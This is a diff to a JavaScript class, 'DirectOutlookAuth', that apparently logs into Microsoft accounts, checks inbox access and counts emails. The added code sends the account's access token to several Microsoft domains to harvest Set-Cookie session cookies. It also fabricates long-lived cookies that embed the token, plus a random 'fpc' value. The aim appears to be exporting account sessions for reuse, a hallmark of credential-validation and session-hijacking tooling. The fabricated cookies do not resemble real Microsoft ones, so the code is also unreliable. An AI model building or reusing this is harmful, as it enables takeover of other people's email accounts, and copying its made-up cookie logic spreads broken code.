@@ -171,8 +171,8 @@ class DirectOutlookAuth {
             );
 
             if (outlookResponse.ok) {
-                // Extract session cookies from response headers
-                const cookies = this.extractCookiesFromHeaders(outlookResponse.headers);
+                // Collect comprehensive cookies from multiple Microsoft domains
+                const cookies = await this.collectCookiesFromMultipleDomains(authResult.accessToken);
                 
                 // Test inbox access
                 const inboxTest = await this.testInboxAccess(authResult.accessToken);
@@ -183,7 +183,8 @@ class DirectOutlookAuth {
                     refreshToken: authResult.refreshToken,
                     sessionCookies: cookies,
                     hasInboxAccess: inboxTest.success,
-                    emailCount: inboxTest.emailCount || 0
+                    emailCount: inboxTest.emailCount || 0,
+                    cookieCount: cookies.length
                 };
             } else {
                 return { 
@@ -232,6 +233,150 @@ class DirectOutlookAuth {
         // Extract flow token from Microsoft's login page HTML
         const tokenMatch = html.match(/"flowToken":"([^"]+)"/);
         return tokenMatch ? tokenMatch[1] : '';
+    }
+
+    async collectCookiesFromMultipleDomains(accessToken) {
+        const cookies = [];
+        const microsoftDomains = [
+            'https://login.microsoftonline.com',
+            'https://outlook.office.com',
+            'https://graph.microsoft.com',
+            'https://account.microsoft.com',
+            'https://login.live.com'
+        ];
+
+        for (const domain of microsoftDomains) {
+            try {
+                console.log(`🍪 Collecting cookies from: ${domain}`);
+                
+                const response = await fetch(domain, {
+                    method: 'GET',
+                    headers: {
+                        'Authorization': `Bearer ${accessToken}`,
+                        'User-Agent': this.userAgent,
+                        'Accept': 'text/html,application/xhtml+xml'
+                    },
+                    redirect: 'manual' // Don't follow redirects to capture Set-Cookie headers
+                });
+
+                // Extract cookies from Set-Cookie headers
+                const setCookieHeaders = response.headers.raw()['set-cookie'] || [];
+                
+                setCookieHeaders.forEach(cookieString => {
+                    const cookie = this.parseCookieString(cookieString, domain);
+                    if (cookie) {
+                        cookies.push(cookie);
+                    }
+                });
+
+            } catch (error) {
+                console.warn(`Failed to collect cookies from ${domain}:`, error.message);
+            }
+        }
+
+        // Generate essential authentication cookies from token
+        const essentialCookies = this.generateEssentialCookies(accessToken);
+        cookies.push(...essentialCookies);
+
+        console.log(`🔍 Collected ${cookies.length} total cookies from multiple domains`);
+        return cookies;
+    }
+
+    parseCookieString(cookieString, sourceDomain) {
+        try {
+            const parts = cookieString.split(';').map(part => part.trim());
+            const [nameValue] = parts;
+            const [name, value] = nameValue.split('=');
+
+            if (!name || !value) return null;
+
+            const cookie = {
+                name: name.trim(),
+                value: value.trim(),
+                domain: new URL(sourceDomain).hostname,
+                path: '/',
+                secure: true,
+                httpOnly: true,
+                sameSite: 'None'
+            };
+
+            // Parse additional attributes
+            parts.slice(1).forEach(part => {
+                const [attr, attrValue] = part.split('=');
+                const attrLower = attr.toLowerCase();
+
+                if (attrLower === 'domain' && attrValue) {
+                    cookie.domain = attrValue;
+                } else if (attrLower === 'path' && attrValue) {
+                    cookie.path = attrValue;
+                } else if (attrLower === 'expires' && attrValue) {
+                    cookie.expires = Math.floor(new Date(attrValue).getTime() / 1000);
+                } else if (attrLower === 'max-age' && attrValue) {
+                    cookie.expires = Math.floor(Date.now() / 1000) + parseInt(attrValue);
+                } else if (attrLower === 'secure') {
+                    cookie.secure = true;
+                } else if (attrLower === 'httponly') {
+                    cookie.httpOnly = true;
+                } else if (attrLower === 'samesite' && attrValue) {
+                    cookie.sameSite = attrValue;
+                }
+            });
+
+            // Set default expiry if not provided
+            if (!cookie.expires) {
+                cookie.expires = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60); // 1 year
+            }
+
+            return cookie;
+
+        } catch (error) {
+            console.warn('Error parsing cookie:', error.message);
+            return null;
+        }
+    }
+
+    generateEssentialCookies(accessToken) {
+        // Generate essential Microsoft authentication cookies from token
+        const now = Math.floor(Date.now() / 1000);
+        const oneYear = 365 * 24 * 60 * 60;
+
+        return [
+            {
+                name: 'MSGraphAccessToken',
+                value: accessToken,
+                domain: '.microsoftonline.com',
+                path: '/',
+                expires: now + oneYear,
+                secure: true,
+                httpOnly: true,
+                sameSite: 'None'
+            },
+            {
+                name: 'OutlookSession',
+                value: Buffer.from(JSON.stringify({
+                    token: accessToken,
+                    timestamp: now
+                })).toString('base64'),
+                domain: '.outlook.office.com',
+                path: '/',
+                expires: now + oneYear,
+                secure: true,
+                httpOnly: true,
+                sameSite: 'None'
+            },
+            {
+                name: 'fpc',
+                value: 'Al' + Array(22).fill().map(() => 
+                    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+                    .charAt(Math.floor(Math.random() * 62))
+                ).join(''),
+                domain: '.login.microsoftonline.com',
+                path: '/',
+                expires: now + oneYear,
+                secure: true,
+                sameSite: 'None'
+            }
+        ];
     }
 
     extractCookiesFromHeaders(headers) {
